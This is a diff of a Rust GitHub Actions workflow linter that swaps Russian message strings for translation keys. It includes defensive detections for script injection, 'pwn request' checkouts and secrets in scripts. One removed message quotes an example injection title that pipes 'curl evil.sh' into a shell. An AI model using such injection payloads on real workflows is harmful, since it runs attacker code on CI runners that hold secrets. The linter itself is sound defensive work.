-                gh.job_issue(&extend(&base, kp!["runs-on"]), id, draft!("gh-runner-retired", Error, title = tr!("{0}: раннер {1} больше не существует", q(id), label), when = when_running.clone(), how = tr!("Задание не начнётся: «This request was automatically failed because there were no enabled runners online to process the request…» (образ {0} отключён — {1}).", label, date), why = tr!("GitHub удаляет старые образы раннеров."), fix = tr!("runs-on: {0} (или {1}-latest)", replacement, label.split('-').next().unwrap_or_default())));
+                gh.job_issue(&extend(&base, kp!["runs-on"]), id, draft!("gh-runner-retired", Error, title = tr!("runner-no-longer-exists", q(id), label), when = when_running.clone(), how = tr!("job-wont-start-this-request", label, date), why = tr!("github-removes-old-runner-images"), fix = tr!("runs-on-or-latest", replacement, label.split('-').next().unwrap_or_default())));
             }
         }
         let windows_or_mac = labels.iter().any(|label| label.starts_with("windows") || label.starts_with("macos"));
         if job.get("container").is_some() && windows_or_mac {
-            gh.job_issue(&extend(&base, kp!["container"]), id, draft!("gh-container-os", Error, title = tr!("{0}: container на {1}", q(id), labels.join(", ")), when = when_running.clone(), how = tr!("Задание упадёт на первом шаге: «Container operations are only supported on Linux runners»."), why = tr!("Контейнеры в Actions работают только на Linux."), fix = "runs-on: ubuntu-latest"));
+            gh.job_issue(&extend(&base, kp!["container"]), id, draft!("gh-container-os", Error, title = tr!("container-on", q(id), labels.join(", ")), when = when_running.clone(), how = tr!("job-will-fail-on-first"), why = tr!("containers-in-actions-work-only"), fix = "runs-on: ubuntu-latest"));
         }
         if let Some(timeout) = job.get("timeout-minutes")
             && js_number(Some(timeout)) > 360.0
             && !labels.iter().any(|label| label == "self-hosted")
         {
-            gh.job_issue(&extend(&base, kp!["timeout-minutes"]), id, draft!("gh-timeout-limit", Info, title = tr!("{0}: timeout-minutes {1} — больше 6 часов", q(id), arg(timeout)), when = when_executing.clone(), how = tr!("На раннерах GitHub задание всё равно будет остановлено через 6 часов."), why = tr!("Лимит GitHub-hosted раннеров — 360 минут."), fix = tr!("Разбейте работу на части или используйте свой раннер.")));
+            gh.job_issue(&extend(&base, kp!["timeout-minutes"]), id, draft!("gh-timeout-limit", Info, title = tr!("timeout-minutes-more-than-6", q(id), arg(timeout)), when = when_executing.clone(), how = tr!("on-github-runners-job-will"), why = tr!("github-hosted-runner-limit-is"), fix = tr!("split-work-into-parts-or")));
         }
 
         // strategy / matrix
@@ -450,16 +450,16 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
             }
             total = total.saturating_add(crate::load_common_as_array(matrix.get("include")).len());
             if total > 256 {
-                gh.job_issue(&extend(&base, kp!["strategy", "matrix"]), id, draft!("gh-matrix-limit", Error, title = tr!("{0}: матрица даёт {1} заданий", q(id), total), how = gh_rejected("Strategy matrix: the maximum of 256 jobs per workflow run was exceeded"), why = tr!("Не более 256 комбинаций."), fix = tr!("Сократите значения матрицы.")));
+                gh.job_issue(&extend(&base, kp!["strategy", "matrix"]), id, draft!("gh-matrix-limit", Error, title = tr!("matrix-produces-jobs", q(id), total), how = gh_rejected("Strategy matrix: the maximum of 256 jobs per workflow run was exceeded"), why = tr!("at-most-256-combinations"), fix = tr!("reduce-matrix-values")));
             }
         }
 
         // Шаги
         let steps = job.get("steps");
         match steps {
-            None => gh.job_issue(&base, id, draft!("gh-no-steps", Error, title = tr!("{0}: нет steps", q(id)), how = gh_rejected("Required property is missing: steps"), why = tr!("Заданию нечего выполнять."), fix = "steps:\n  - uses: actions/checkout@v5\n  - run: echo ok")),
+            None => gh.job_issue(&base, id, draft!("gh-no-steps", Error, title = tr!("no-steps", q(id)), how = gh_rejected("Required property is missing: steps"), why = tr!("job-has-nothing-to-run"), fix = "steps:\n  - uses: actions/checkout@v5\n  - run: echo ok")),
             Some(Value::Seq(items)) if !items.is_empty() => {}
-            Some(_) => gh.job_issue(&extend(&base, kp!["steps"]), id, draft!("gh-steps-empty", Error, title = tr!("{0}: steps пуст или не список", q(id)), how = gh_rejected("A sequence was expected"), why = tr!("steps — список шагов, каждый начинается с «- »."), fix = "steps:\n  - run: echo ok")),
+            Some(_) => gh.job_issue(&extend(&base, kp!["steps"]), id, draft!("gh-steps-empty", Error, title = tr!("steps-is-empty-or-not", q(id)), how = gh_rejected("A sequence was expected"), why = tr!("steps-is-list-of-steps"), fix = "steps:\n  - run: echo ok")),
         }
         let step_list = crate::load_common_as_array(steps);
         let mut step_ids: Vec<String> = Vec::new();
@@ -484,30 +484,30 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
             line: gh.line(&base),
             image,
             system: "github",
-            where_text: Some(tr!("задании {0}", q(id))),
+            where_text: Some(tr!("job", q(id))),
             ..ScriptJob::default()
         };
         for (index, step) in step_list.iter().copied().enumerate() {
             let step_path = extend(&base, kp!["steps", index]);
             let label = match step.get("name").filter(|value| value.truthy()) {
                 Some(name) => q(name.js_string()),
-                None => tr!("шаг {0}", index + 1),
+                None => tr!("step", index + 1),
             };
             let Value::Map(step_map) = step else {
-                gh.job_issue(&step_path, id, draft!("gh-step-type", Error, title = tr!("{0}: {1} — не карта", q(id), label), how = gh_rejected("A mapping was expected"), why = tr!("Шаг — набор ключей (uses / run / name…)."), fix = "- run: echo ok"));
+                gh.job_issue(&step_path, id, draft!("gh-step-type", Error, title = tr!("isnt-map", q(id), label), how = gh_rejected("A mapping was expected"), why = tr!("step-is-set-of-keys"), fix = "- run: echo ok"));
                 continue;
             };
             for key in step_map.keys() {
                 if !GH_STEP.contains(&key.as_str()) {
-                    gh.job_issue(&extend(&step_path, kp![key]), id, draft!("gh-step-key", Error, title = tr!("{0}: {1} — неизвестный ключ {2}", q(id), label, q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("Допустимы: {0}.{1}", GH_STEP.join(", "), did_you_mean(key, GH_STEP)), fix = tr!("Исправьте ключ.")));
+                    gh.job_issue(&extend(&step_path, kp![key]), id, draft!("gh-step-key", Error, title = tr!("unknown-key-2", q(id), label, q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("allowed", GH_STEP.join(", "), did_you_mean(key, GH_STEP)), fix = tr!("fix-key")));
                 }
             }
             let (uses, run) = (step.get("uses"), step.get("run"));
             if uses.is_some() && run.is_some() {
-                gh.job_issue(&step_path, id, draft!("gh-step-both", Error, title = tr!("{0}: {1} — и uses, и run", q(id), label), how = gh_rejected("a step cannot have both the `uses` and `run` keys"), why = tr!("Шаг либо вызывает действие, либо выполняет команды."), fix = tr!("Разделите на два шага.")));
+                gh.job_issue(&step_path, id, draft!("gh-step-both", Error, title = tr!("has-both-uses-and-run", q(id), label), how = gh_rejected("a step cannot have both the `uses` and `run` keys"), why = tr!("step-either-calls-action-or"), fix = tr!("split-it-into-two-steps")));
             }
             if uses.is_none() && run.is_none() {
-                gh.job_issue(&step_path, id, draft!("gh-step-none", Error, title = tr!("{0}: {1} — нет ни uses, ни run", q(id), label), how = gh_rejected("Required property is missing: uses or run"), why = tr!("Шагу нечего делать."), fix = "- run: echo ok"));
+                gh.job_issue(&step_path, id, draft!("gh-step-none", Error, title = tr!("has-neither-uses-nor-run", q(id), label), how = gh_rejected("Required property is missing: uses or run"), why = tr!("step-has-nothing-to-do"), fix = "- run: echo ok"));
             }
             if let Some(condition) = step.get("if") {
                 gh.check_if(condition, &extend(&step_path, kp!["if"]), id, false);
@@ -519,20 +519,20 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                     checked_out = true;
                     let reference = step.get("with").filter(|with| matches!(with, Value::Map(_))).and_then(|with| non_null(with.get("ref"))).map_or_else(String::new, Value::js_string);
                     if pr_target && re!(r"github\.event\.pull_request\.head\.(sha|ref)|github\.head_ref").test(&reference) {
-                        gh.job_issue(&extend(&step_path, kp!["with", "ref"]), id, draft!("gh-pwn-request", Warning, title = tr!("{0}: pull_request_target + checkout кода из PR", q(id)), when = tr!("При pull request из форка"), how = tr!("Код из чужого PR выполнится с доступом к секретам и токену с правом записи — классическая атака «pwn request»."), why = tr!("pull_request_target работает в контексте основного репозитория (с секретами), а checkout берёт непроверенный код PR."), fix = tr!("Используйте pull_request, или не запускайте код из PR в этом workflow.")));
+                        gh.job_issue(&extend(&step_path, kp!["with", "ref"]), id, draft!("gh-pwn-request", Warning, title = tr!("pull-request-target-checkout-of", q(id)), when = tr!("on-pull-request-from-fork"), how = tr!("code-from-someone-elses-pr"), why = tr!("pull-request-target-runs-in"), fix = tr!("use-pull-request-or-dont")));
                     }
                 }
                 if uses_text.starts_with("./") {
                     let dir = uses_text.trim_end_matches('/');
                     let inner: String = dir.chars().skip(2).collect();
                     if !checked_out {
-                        gh.job_issue(&uses_path, id, draft!("gh-local-before-checkout", Error, title = tr!("{0}: локальное действие {1} до checkout", q(id), uses_text), when = when_executing.clone(), how = tr!("Шаг упадёт: «Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/{0}'. Did you forget to run actions/checkout before running your local action?»", inner), why = tr!("Файлы репозитория появляются на раннере только после actions/checkout."), fix = tr!("Поставьте - uses: actions/checkout@v5 раньше этого шага.")));
+                        gh.job_issue(&uses_path, id, draft!("gh-local-before-checkout", Error, title = tr!("local-action-before-checkout", q(id), uses_text), when = when_executing.clone(), how = tr!("step-will-fail-cant-find", inner), why = tr!("repository-files-appear-on-runner"), fix = tr!("put-uses-actions-checkout-v5")));
                     } else if !["action.yml", "action.yaml", "Dockerfile"].iter().any(|name| gh.cx.repo.has_file(&format!("{dir}/{name}"))) {
-                        gh.job_issue(&uses_path, id, draft!("gh-local-missing", Error, title = tr!("{0}: нет действия {1}", q(id), uses_text), when = when_executing.clone(), how = tr!("Шаг упадёт: «Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/{0}'».", inner), why = tr!("В {0} нет action.yml.", q(dir)), fix = tr!("Проверьте путь.")));
+                        gh.job_issue(&uses_path, id, draft!("gh-local-missing", Error, title = tr!("no-action", q(id), uses_text), when = when_executing.clone(), how = tr!("step-will-fail-cant-find-action", inner), why = tr!("has-no-action-yml", q(dir)), fix = tr!("check-path")));
                     }
                 } else if !uses_text.starts_with("docker://") {
                     if !uses_text.contains('@') {
-                        gh.job_issue(&uses_path, id, draft!("gh-uses-no-ref", Error, title = tr!("{0}: {1} без @версии", q(id), uses_text), how = gh_rejected("the `uses' attribute must be a path, a Docker image, or owner/repo@ref"), why = tr!("Для действия из другого репозитория нужна версия (тег, ветка или SHA)."), fix = tr!("{0}@v1 (лучше — полный SHA коммита)", uses_text)));
+                        gh.job_issue(&uses_path, id, draft!("gh-uses-no-ref", Error, title = tr!("without-version", q(id), uses_text), how = gh_rejected("the `uses' attribute must be a path, a Docker image, or owner/repo@ref"), why = tr!("action-from-another-repository-needs"), fix = tr!("v1-better-full-commit-sha", uses_text)));
                     } else {
                         let mut parts = uses_text.split('@');
                         let name = parts.next().unwrap_or_default();
@@ -543,12 +543,12 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                             && major.as_deref().is_some_and(|major| number_of_text(major) <= *last)
                         {
                             let severity = if *is_error { crate::load::model::CiSeverity::Error } else { crate::load::model::CiSeverity::Warning };
-                            let mut item = draft!("gh-action-old", Warning, title = tr!("{0}: {1} устарело", q(id), uses_text), when = when_executing.clone(), how = tr!(text), why = tr!("Версии {0} до {1} отключены или переведены в устаревшие.", name, fixed), fix = format!("uses: {name}@{fixed}"));
+                            let mut item = draft!("gh-action-old", Warning, title = tr!("is-deprecated", q(id), uses_text), when = when_executing.clone(), how = tr!(text), why = tr!("versions-of-before-are-disabled", name, fixed), fix = format!("uses: {name}@{fixed}"));
                             item.severity = severity;
                             gh.job_issue(&uses_path, id, item);
                         }
                         if !name.starts_with("actions/") && matches!(reference, "main" | "master") {
-                            gh.job_issue(&uses_path, id, draft!("gh-action-branch", Info, title = tr!("{0}: {1} — по ветке", q(id), uses_text), when = tr!("При каждом запуске"), how = tr!("Действие может измениться в любой момент — и сломать сборку или выполнить чужой код с вашими секретами."), why = tr!("Ссылка на ветку стороннего репозитория не фиксирует версию."), fix = tr!("Укажите тег или полный SHA коммита.")));
+                            gh.job_issue(&uses_path, id, draft!("gh-action-branch", Info, title = tr!("by-branch", q(id), uses_text), when = tr!("on-every-run"), how = tr!("action-can-change-at-any"), why = tr!("branch-reference-to-third-party"), fix = tr!("specify-tag-or-full-commit")));
                         }
                     }
                 }
@@ -557,21 +557,21 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                 let text = run.js_string();
                 let run_path = extend(&step_path, kp!["run"]);
                 if re!(r"::set-output\b|::save-state\b").test(&text) {
-                    gh.job_issue(&run_path, id, draft!("gh-set-output", Warning, title = tr!("{0}: {1} — ::set-output устарел", q(id), label), when = when_executing.clone(), how = tr!("Сейчас выдаёт предупреждение «The `set-output` command is deprecated», после отключения значение не попадёт в outputs."), why = tr!("Команды ::set-output / ::save-state заменены файлами окружения."), fix = "echo \"name=value\" >> \"$GITHUB_OUTPUT\""));
+                    gh.job_issue(&run_path, id, draft!("gh-set-output", Warning, title = tr!("set-output-is-deprecated", q(id), label), when = when_executing.clone(), how = tr!("it-now-shows-warning-set"), why = tr!("set-output-save-state-commands"), fix = "echo \"name=value\" >> \"$GITHUB_OUTPUT\""));
                 }
                 if re!(r"::set-env\b|::add-path\b").test(&text) {
-                    gh.job_issue(&run_path, id, draft!("gh-set-env", Error, title = tr!("{0}: {1} — ::set-env / ::add-path отключены", q(id), label), when = when_executing.clone(), how = tr!("Шаг упадёт: «The `set-env` command is disabled. Please upgrade to using Environment Files»."), why = tr!("Команды отключены по соображениям безопасности."), fix = "echo \"NAME=value\" >> \"$GITHUB_ENV\"; echo \"/path\" >> \"$GITHUB_PATH\""));
+                    gh.job_issue(&run_path, id, draft!("gh-set-env", Error, title = tr!("set-env-add-path-are", q(id), label), when = when_executing.clone(), how = tr!("step-will-fail-set-env"), why = tr!("commands-were-disabled-for-security"), fix = "echo \"NAME=value\" >> \"$GITHUB_ENV\"; echo \"/path\" >> \"$GITHUB_PATH\""));
                 }
                 if let Some(groups) = re!(r"\$\{\{\s*github\.(event\.(issue|pull_request|comment|review|review_comment|discussion|head_commit|commits)[\w.[\]*]*\.(title|body|message|name|email|label|ref)|head_ref)\s*\}\}").exec(&text) {
                     let whole = groups[0].clone().unwrap_or_default();
-                    gh.job_issue(&run_path, id, draft!("gh-script-injection", Warning, title = tr!("{0}: {1} — {2} прямо в команде", q(id), label, whole), when = tr!("Когда автор issue/PR — посторонний"), how = tr!("Текст из заголовка/описания подставится в скрипт как есть: заголовок вида «\"; curl evil.sh | sh #» выполнится на раннере."), why = tr!("Выражения ${{ }} подставляются до запуска shell, без экранирования."), fix = format!("env:\n  TITLE: {whole}\nrun: echo \"$TITLE\"")));
+                    gh.job_issue(&run_path, id, draft!("gh-script-injection", Warning, title = tr!("right-in-command", q(id), label, whole), when = tr!("when-issue-pr-author-is"), how = tr!("text-from-title-description-is"), why = tr!("expressions-are-substituted-before-shell"), fix = format!("env:\n  TITLE: {whole}\nrun: echo \"$TITLE\"")));
                 }
                 if !checked_out
                     && used_repo.is_none()
                     && re!(r"(^|\s|&&|;)(\.\/|npm (ci|install|run|test)|yarn|pnpm|make\b|mvn|gradle|\.\/gradlew|go (build|test)|cargo|pip install -r|python [\w./-]+\.py|docker build|composer install|bundle install)", "m").test(&text)
                 {
                     let suffix = step.get("name").filter(|value| value.truthy()).map_or_else(String::new, |name| format!(" ({})", name.js_string()));
-                    used_repo = Some((index, tr!("шага {0}{1}", index + 1, suffix)));
+                    used_repo = Some((index, tr!("step-2", index + 1, suffix)));
                 }
                 let line_base = gh.line(&run_path);
                 let multi = text.contains('\n');
@@ -602,26 +602,26 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                 for groups in re!(r"\bsteps\.([A-Za-z_][\w-]*)\.").match_all(&text) {
                     let name = groups[1].clone().unwrap_or_default();
                     if !step_ids.contains(&name) {
-                        gh.job_issue(&path, id, draft!("gh-step-ref", Warning, title = tr!("{0}: steps.{1} — нет шага с таким id", q(id), name), when = when_executing.clone(), how = tr!("Выражение даст пустую строку — условие или параметр будут не тем, что ожидается."), why = tr!("В задании нет шага с id: {0}.{1}", name, did_you_mean(&name, step_ids.iter().map(String::as_str))), fix = tr!("Добавьте id: {0} нужному шагу.", name)));
+                        gh.job_issue(&path, id, draft!("gh-step-ref", Warning, title = tr!("steps-no-step-with-this", q(id), name), when = when_executing.clone(), how = tr!("expression-will-give-empty-string"), why = tr!("job-has-no-step-with", name, did_you_mean(&name, step_ids.iter().map(String::as_str))), fix = tr!("add-id-to-right-step", name)));
                     }
                 }
                 for groups in re!(r"\bmatrix\.([A-Za-z_][\w-]*)").match_all(&text) {
                     let name = groups[1].clone().unwrap_or_default();
                     if !matrix_keys.contains(&name) {
-                        let why = if matrix_keys.is_empty() { tr!("У задания нет strategy.matrix.") } else { tr!("В матрице есть: {0}.", matrix_keys.join(", ")) };
-                        gh.job_issue(&path, id, draft!("gh-matrix-ref", Warning, title = tr!("{0}: matrix.{1} — такого измерения нет", q(id), name), when = when_executing.clone(), how = tr!("Подставится пустая строка."), why = why, fix = tr!("Исправьте имя или добавьте его в матрицу.")));
+                        let why = if matrix_keys.is_empty() { tr!("job-has-no-strategy-matrix") } else { tr!("matrix-has", matrix_keys.join(", ")) };
+                        gh.job_issue(&path, id, draft!("gh-matrix-ref", Warning, title = tr!("matrix-no-such-dimension", q(id), name), when = when_executing.clone(), how = tr!("empty-string-will-be-substituted"), why = why, fix = tr!("fix-name-or-add-it")));
                     }
                 }
                 for groups in re!(r"\bneeds\.([A-Za-z_][\w-]*)\.outputs\.([A-Za-z_][\w-]*)").match_all(&text) {
                     let (name, output) = (groups[1].clone().unwrap_or_default(), groups[2].clone().unwrap_or_default());
                     if !needs.contains(&name) {
                         let fixed: Vec<&str> = needs.iter().map(String::as_str).chain([name.as_str()]).collect();
-                        gh.job_issue(&path, id, draft!("gh-needs-outputs", Warning, title = tr!("{0}: needs.{1}.outputs без needs: {2}", q(id), name, name), when = when_executing.clone(), how = tr!("Значение будет пустым: результаты задания доступны только тем, кто его ждёт."), why = tr!("{0} не указано в needs задания {1}.", q(&name), q(id)), fix = format!("needs: [{}]", fixed.join(", "))));
+                        gh.job_issue(&path, id, draft!("gh-needs-outputs", Warning, title = tr!("needs-outputs-without-needs", q(id), name, name), when = when_executing.clone(), how = tr!("value-will-be-empty-jobs"), why = tr!("isnt-listed-in-needs-of", q(&name), q(id)), fix = format!("needs: [{}]", fixed.join(", "))));
                     } else if let Some(Value::Map(outputs)) = jobs.get(&name).and_then(|other| other.get("outputs"))
                         && !outputs.contains_key(&output)
                     {
                         let list: Vec<&str> = outputs.keys().map(String::as_str).collect();
-                        gh.job_issue(&path, id, draft!("gh-output-missing", Warning, title = tr!("{0}: у {1} нет output {2}", q(id), q(&name), q(&output)), when = when_executing.clone(), how = tr!("Подставится пустая строка."), why = tr!("outputs задания {0}: {1}.", q(&name), list.join(", ")), fix = tr!("Исправьте имя или объявите output.")));
+                        gh.job_issue(&path, id, draft!("gh-output-missing", Warning, title = tr!("has-no-output", q(id), q(&name), q(&output)), when = when_executing.clone(), how = tr!("empty-string-will-be-substituted"), why = tr!("outputs-of-job", q(&name), list.join(", ")), fix = tr!("fix-name-or-declare-output")));
                     }
                 }
             }
@@ -630,7 +630,7 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
             gh.check_if(condition, &extend(&base, kp!["if"]), id, true);
         }
         if let Some((index, label)) = used_repo {
-            gh.job_issue(&extend(&base, kp!["steps", index]), id, draft!("gh-no-checkout", Warning, title = tr!("{0}: нет actions/checkout до {1}", q(id), label), when = when_executing.clone(), how = tr!("Команда упадёт: на чистом раннере нет файлов репозитория — «No such file or directory», «npm ERR! enoent Could not read package.json»."), why = tr!("Код репозитория появляется на раннере только после шага actions/checkout."), fix = tr!("Первым шагом:\n- uses: actions/checkout@v5")));
+            gh.job_issue(&extend(&base, kp!["steps", index]), id, draft!("gh-no-checkout", Warning, title = tr!("no-actions-checkout-before", q(id), label), when = when_executing.clone(), how = tr!("command-will-fail-clean-runner"), why = tr!("repository-code-appears-on-runner"), fix = tr!("as-first-step-uses-actions")));
         }
         if checked_out && !windows_or_mac {
             check_scripts(std::slice::from_ref(&script_job), gh.cx, "github")?;
@@ -638,7 +638,7 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
             for line in &script_job.lines {
                 for (regex, what) in SECRET_VALUE.iter() {
                     if regex.is_match(&line.text) {
-                        gh.cx.add(draft!("secret-in-script", Error, title = tr!("В шаге задания {0} открытым текстом {1}", q(id), tr!(what)), when = tr!("Уже сейчас — файл в истории Git"), how = tr!("Ключ увидят все, у кого есть доступ к репозиторию."), why = tr!("Секреты нужно хранить в Settings → Secrets."), fix = tr!("Отзовите ключ и используйте ${{ secrets.ИМЯ }}."), file = file.to_owned(), line = line.line, job = id.clone()));
+                        gh.cx.add(draft!("secret-in-script", Error, title = tr!("step-of-job-has-in", q(id), tr!(what)), when = tr!("right-now-file-is-in"), how = tr!("everyone-with-access-to-repository"), why = tr!("secrets-must-be-stored-in"), fix = tr!("revoke-key-and-use-secrets"), file = file.to_owned(), line = line.line, job = id.clone()));
                     }
                 }
             }
@@ -670,7 +670,7 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
         let mut unique: Vec<&str> = cycle.iter().map(String::as_str).collect::<HashSet<_>>().into_iter().collect();
         unique.sort_by(|a, b| gorynych_core::js::utf16_cmp(a, b));
         if reported.insert(unique.join(",")) {
-            gh.issue(&kp!["jobs", &cycle[0], "needs"], draft!("gh-needs-cycle", Error, title = tr!("Задания ждут друг друга по кругу: {0}", cycle.join(" → ")), how = gh_rejected(format!("Job '{}' depends on job '{}' which creates a cycle in the dependency graph.", cycle[0], cycle[1])), why = tr!("Ни одно из заданий не может начаться первым."), fix = tr!("Уберите одну из зависимостей."), job = cycle[0].clone()));
+            gh.issue(&kp!["jobs", &cycle[0], "needs"], draft!("gh-needs-cycle", Error, title = tr!("jobs-wait-for-each-other", cycle.join(" → ")), how = gh_rejected(format!("Job '{}' depends on job '{}' which creates a cycle in the dependency graph.", cycle[0], cycle[1])), why = tr!("none-of-jobs-can-start"), fix = tr!("remove-one-of-dependencies"), job = cycle[0].clone()));
         }
     }
     Ok(())
